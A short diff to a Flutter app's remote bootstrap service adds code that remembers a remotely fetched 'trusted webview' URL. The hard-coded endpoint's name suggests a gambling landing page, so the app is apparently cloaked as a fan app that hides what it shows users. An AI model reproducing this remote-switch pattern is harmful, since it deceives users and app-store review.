@@ -2,6 +2,7 @@ import 'dart:convert';
 
 import 'package:flutter/foundation.dart';
 import 'package:http/http.dart' as http;
+import 'package:shared_preferences/shared_preferences.dart';
 
 class RemoteBootstrapException implements Exception {
   const RemoteBootstrapException(this.message);
@@ -14,11 +15,35 @@ class RemoteBootstrapException implements Exception {
 
 class RemoteBootstrapService {
   static const String _endpoint = 'https://rusogmblng.online/lander/jsonclo1';
+  static const String _trustedWebViewKey = 'trusted_webview_opened_once';
+  static const String _trustedWebViewUrlKey = 'trusted_webview_last_url';
 
   final http.Client _client;
 
   RemoteBootstrapService({http.Client? client})
       : _client = client ?? http.Client();
+
+  Future<bool> wasWebViewOpenedSuccessfully() async {
+    final prefs = await SharedPreferences.getInstance();
+    final opened = prefs.getBool(_trustedWebViewKey) ?? false;
+    debugPrint('FanArenaStartup: trusted_webview_flag=$opened');
+    return opened;
+  }
+
+  Future<void> markWebViewOpenedSuccessfully(String url) async {
+    final prefs = await SharedPreferences.getInstance();
+    await prefs.setBool(_trustedWebViewKey, true);
+    await prefs.setString(_trustedWebViewUrlKey, url);
+    debugPrint('FanArenaStartup: trusted_webview_flag_saved=true');
+    debugPrint('FanArenaStartup: trusted_webview_url_saved=$url');
+  }
+
+  Future<String?> getTrustedWebViewUrl() async {
+    final prefs = await SharedPreferences.getInstance();
+    final url = prefs.getString(_trustedWebViewUrlKey);
+    debugPrint('FanArenaStartup: trusted_webview_url=$url');
+    return url;
+  }
 
   Future<String> fetchStartupUrl() async {
     late http.Response response;
